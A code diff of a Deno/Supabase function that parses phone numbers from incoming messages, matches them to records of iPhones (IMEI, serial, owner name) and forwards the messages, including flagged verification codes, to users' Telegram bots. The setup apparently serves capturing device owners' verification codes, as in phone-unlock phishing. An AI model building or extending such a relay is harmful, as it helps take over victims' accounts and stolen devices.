@@ -1,4 +1,3 @@
-
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
 
 const corsHeaders = {
@@ -126,118 +125,122 @@ serve(async (req) => {
     const { createClient } = await import('https://esm.sh/@supabase/supabase-js@2');
     const supabase = createClient(supabaseUrl, supabaseKey);
 
-    // Clean and normalize phone number for search
-    const cleanPhoneNumber = phoneNumber.replace(/[\s\-\(\)]/g, '');
-    console.log('Searching for process with phone number:', cleanPhoneNumber);
-
-    // Enhanced search patterns - preserving full numbers
-    const searchPatterns = [
-      cleanPhoneNumber,
-      phoneNumber,
-      cleanPhoneNumber.startsWith('+') ? cleanPhoneNumber : `+${cleanPhoneNumber}`,
-      cleanPhoneNumber.replace('+', ''),
-      // For different country codes, try without them
-      cleanPhoneNumber.replace(/^\+\d{1,4}/, ''),
-      // Try with common variations
-      cleanPhoneNumber.replace(/^\+/, ''),
-    ];
-
-    // Remove duplicates and empty patterns
-    const uniquePatterns = [...new Set(searchPatterns)].filter(p => p && p.length > 0);
-    
-    console.log('Trying search patterns:', uniquePatterns);
-
     let matchedProcess = null;
     let matchedPattern = '';
 
-    // Search for the process
-    for (const pattern of uniquePatterns) {
-      console.log(`Searching with pattern: "${pattern}"`);
+    // Only search for process if we have a valid phone number (not "unknown")
+    if (phoneNumber !== 'unknown') {
+      // Clean and normalize phone number for search
+      const cleanPhoneNumber = phoneNumber.replace(/[\s\-\(\)]/g, '');
+      console.log('Searching for process with phone number:', cleanPhoneNumber);
+
+      // Enhanced search patterns - preserving full numbers
+      const searchPatterns = [
+        cleanPhoneNumber,
+        phoneNumber,
+        cleanPhoneNumber.startsWith('+') ? cleanPhoneNumber : `+${cleanPhoneNumber}`,
+        cleanPhoneNumber.replace('+', ''),
+        // For different country codes, try without them
+        cleanPhoneNumber.replace(/^\+\d{1,4}/, ''),
+        // Try with common variations
+        cleanPhoneNumber.replace(/^\+/, ''),
+      ];
+
+      // Remove duplicates and empty patterns
+      const uniquePatterns = [...new Set(searchPatterns)].filter(p => p && p.length > 0);
       
-      // Search in phone_number field
-      const { data: processes, error: queryError } = await supabase
-        .from('processes')
-        .select(`
-          id,
-          user_id,
-          client_name,
-          iphone_model,
-          imei,
-          serial_number,
-          owner_name,
-          country_code,
-          phone_number,
-          profiles!inner(telegram_bot_token, telegram_chat_id)
-        `)
-        .eq('phone_number', pattern)
-        .not('profiles.telegram_bot_token', 'is', null)
-        .not('profiles.telegram_chat_id', 'is', null)
-        .limit(1);
+      console.log('Trying search patterns:', uniquePatterns);
 
-      if (queryError) {
-        console.error('Database query error for pattern', pattern, ':', queryError);
-        continue;
-      }
-
-      console.log(`Found ${processes?.length || 0} matching processes for phone_number pattern:`, pattern);
-
-      if (processes && processes.length > 0) {
-        matchedProcess = processes[0];
-        matchedPattern = pattern;
-        console.log('Match found with phone_number pattern:', pattern);
-        break;
-      }
-
-      // Also try searching by combining country_code + phone_number
-      console.log(`Searching for pattern "${pattern}" in combined country_code + phone_number`);
-      
-      const { data: combinedProcesses, error: combinedError } = await supabase
-        .from('processes')
-        .select(`
-          id,
-          user_id,
-          client_name,
-          iphone_model,
-          imei,
-          serial_number,
-          owner_name,
-          country_code,
-          phone_number,
-          profiles!inner(telegram_bot_token, telegram_chat_id)
-        `)
-        .not('profiles.telegram_bot_token', 'is', null)
-        .not('profiles.telegram_chat_id', 'is', null)
-        .limit(10);
-
-      if (!combinedError && combinedProcesses) {
-        for (const proc of combinedProcesses) {
-          const fullNumber = `${proc.country_code}${proc.phone_number}`;
-          const fullNumberClean = fullNumber.replace(/[\s\-\(\)]/g, '');
-          
-          if (fullNumberClean === pattern || 
-              fullNumberClean === pattern.replace('+', '') ||
-              fullNumber === pattern ||
-              proc.phone_number === pattern) {
-            matchedProcess = proc;
-            matchedPattern = pattern;
-            console.log('Match found with combined pattern:', pattern, 'matching:', fullNumber);
-            break;
-          }
-        }
+      // Search for the process
+      for (const pattern of uniquePatterns) {
+        console.log(`Searching with pattern: "${pattern}"`);
         
-        if (matchedProcess) break;
+        // Search in phone_number field
+        const { data: processes, error: queryError } = await supabase
+          .from('processes')
+          .select(`
+            id,
+            user_id,
+            client_name,
+            iphone_model,
+            imei,
+            serial_number,
+            owner_name,
+            country_code,
+            phone_number,
+            profiles!inner(telegram_bot_token, telegram_chat_id)
+          `)
+          .eq('phone_number', pattern)
+          .not('profiles.telegram_bot_token', 'is', null)
+          .not('profiles.telegram_chat_id', 'is', null)
+          .limit(1);
+
+        if (queryError) {
+          console.error('Database query error for pattern', pattern, ':', queryError);
+          continue;
+        }
+
+        console.log(`Found ${processes?.length || 0} matching processes for phone_number pattern:`, pattern);
+
+        if (processes && processes.length > 0) {
+          matchedProcess = processes[0];
+          matchedPattern = pattern;
+          console.log('Match found with phone_number pattern:', pattern);
+          break;
+        }
+
+        // Also try searching by combining country_code + phone_number
+        console.log(`Searching for pattern "${pattern}" in combined country_code + phone_number`);
+        
+        const { data: combinedProcesses, error: combinedError } = await supabase
+          .from('processes')
+          .select(`
+            id,
+            user_id,
+            client_name,
+            iphone_model,
+            imei,
+            serial_number,
+            owner_name,
+            country_code,
+            phone_number,
+            profiles!inner(telegram_bot_token, telegram_chat_id)
+          `)
+          .not('profiles.telegram_bot_token', 'is', null)
+          .not('profiles.telegram_chat_id', 'is', null)
+          .limit(10);
+
+        if (!combinedError && combinedProcesses) {
+          for (const proc of combinedProcesses) {
+            const fullNumber = `${proc.country_code}${proc.phone_number}`;
+            const fullNumberClean = fullNumber.replace(/[\s\-\(\)]/g, '');
+            
+            if (fullNumberClean === pattern || 
+                fullNumberClean === pattern.replace('+', '') ||
+                fullNumber === pattern ||
+                proc.phone_number === pattern) {
+              matchedProcess = proc;
+              matchedPattern = pattern;
+              console.log('Match found with combined pattern:', pattern, 'matching:', fullNumber);
+              break;
+            }
+          }
+          
+          if (matchedProcess) break;
+        }
       }
     }
 
     if (!matchedProcess) {
-      console.log('No matching process found for any pattern');
+      console.log('No matching process found');
       return new Response(
         JSON.stringify({ 
           success: false, 
           error: 'Process not found',
-          message: `No se encontró un proceso con el número de teléfono: ${cleanPhoneNumber}`,
-          phone_searched: cleanPhoneNumber,
-          patterns_tried: uniquePatterns,
+          message: phoneNumber === 'unknown' 
+            ? `Mensaje recibido pero no se pudo identificar el remitente: ${messageText}` 
+            : `No se encontró un proceso con el número de teléfono: ${phoneNumber}`,
+          phone_searched: phoneNumber,
           extraction_details: result
         }), 
         { 
@@ -290,7 +293,7 @@ serve(async (req) => {
 🔢 Serie: ${process.serial_number}
 ${process.owner_name ? `👥 Propietario: ${process.owner_name}` : ''}
 
-📞 Remitente: ${phoneNumber}
+📞 Remitente: ${phoneNumber === 'unknown' ? 'Desconocido' : phoneNumber}
 ${messageType}: ${displayMessage}
 
 🤖 Bot Astro en línea 🟢`;
@@ -336,7 +339,7 @@ ${messageType}: ${displayMessage}
         message: 'Notification sent successfully',
         process_id: process.id,
         user_id: process.user_id,
-        phone_number: cleanPhoneNumber,
+        phone_number: phoneNumber,
         matched_pattern: matchedPattern,
         message_content: messageText,
         is_verification_code: isVerificationCode,
@@ -412,7 +415,7 @@ function extractPhoneAndMessage(data: NotificationData): {
       }
     }
     
-    // Strategy 2b: Check if message starts with a phone number pattern followed by space and text
+    // Strategy 2b: Check if message starts with international phone number pattern (+XXX XXXX XXXX) followed by space and text
     const phoneAndTextPattern = messageContent.match(/^(\+\d{1,4}[\s\-]?\d{7,15})\s+(.+)$/);
     if (phoneAndTextPattern) {
       const potentialPhone = phoneAndTextPattern[1].trim();
@@ -430,35 +433,36 @@ function extractPhoneAndMessage(data: NotificationData): {
       }
     }
     
-    // Strategy 2c: More careful extraction - find phone at start and remove it completely
+    // Strategy 2c: Enhanced extraction for cases with mixed numbers
     const phoneFromMessage = extractPhoneNumber(messageContent);
     if (phoneFromMessage && phoneFromMessage.length >= 7) {
-      // Create a more robust regex to remove the phone number from the message
       let messageWithoutPhone = messageContent;
       
-      // Remove spaces, dashes, parentheses from the extracted phone for matching
+      // Only remove phone if it's clearly at the beginning and followed by space/text
       const phoneForMatching = phoneFromMessage.replace(/[\s\-\(\)+]/g, '');
       
-      // Create pattern to match the phone number in various formats at the beginning
-      const phoneRemovalPatterns = [
-        new RegExp(`^\\${phoneFromMessage}\\s*`, 'i'),  // Exact match
-        new RegExp(`^\\+?\\s*${phoneForMatching.replace(/^\+/, '')}\\s*`, 'i'),  // Without + and spaces
-        new RegExp(`^\\+?\\s*${phoneForMatching.replace(/^\+/, '').replace(/(.{3})(.{4})(.{4})/, '$1\\s*$2\\s*$3')}\\s*`, 'i'),  // With potential spaces
-      ];
-      
-      // Try to remove the phone number using different patterns
-      for (const pattern of phoneRemovalPatterns) {
-        const cleanedMessage = messageWithoutPhone.replace(pattern, '').trim();
-        if (cleanedMessage.length < messageWithoutPhone.length) {
-          messageWithoutPhone = cleanedMessage;
-          break;
+      // Check if the phone number is at the very start of the message
+      const startsWithPhone = messageContent.match(/^[\+\d\s\-\(\)]+/);
+      if (startsWithPhone) {
+        const phoneSection = startsWithPhone[0];
+        const remainingText = messageContent.substring(phoneSection.length).trim();
+        
+        // If there's remaining text after the phone, use it as message
+        if (remainingText && remainingText.length > 0) {
+          messageWithoutPhone = remainingText;
+        } else {
+          // If no remaining text, check if the entire content is just the phone number
+          const contentDigitsOnly = messageContent.replace(/[\s\-\(\)+]/g, '');
+          const phoneDigitsOnly = phoneFromMessage.replace(/[\s\-\(\)+]/g, '');
+          
+          if (contentDigitsOnly === phoneDigitsOnly) {
+            // The entire message is just the phone number
+            messageWithoutPhone = messageContent;
+          } else {
+            // There might be additional numbers that aren't part of the phone
+            messageWithoutPhone = messageContent.replace(phoneFromMessage, '').trim();
+          }
         }
-      }
-      
-      // If message still contains digits that look like part of the phone, try harder
-      if (messageWithoutPhone.match(/^\d/)) {
-        // Remove any remaining digits at the start that are part of the phone
-        messageWithoutPhone = messageWithoutPhone.replace(/^[\d\s\-\(\)]+/, '').trim();
       }
       
       console.log('Strategy 2c successful - phone from start of message:', phoneFromMessage, 'message:', messageWithoutPhone);
@@ -467,6 +471,17 @@ function extractPhoneAndMessage(data: NotificationData): {
         phoneNumber: phoneFromMessage,
         messageText: messageWithoutPhone,
         method: 'NotificationMessage phone extraction'
+      };
+    }
+    
+    // Strategy 2d: If no clear phone pattern found, but message contains numbers, treat as message with unknown sender
+    if (messageContent.match(/\d/)) {
+      console.log('Strategy 2d - treating numeric content as message with unknown sender');
+      return {
+        success: true,
+        phoneNumber: 'unknown',
+        messageText: messageContent,
+        method: 'numeric message without clear phone'
       };
     }
   }
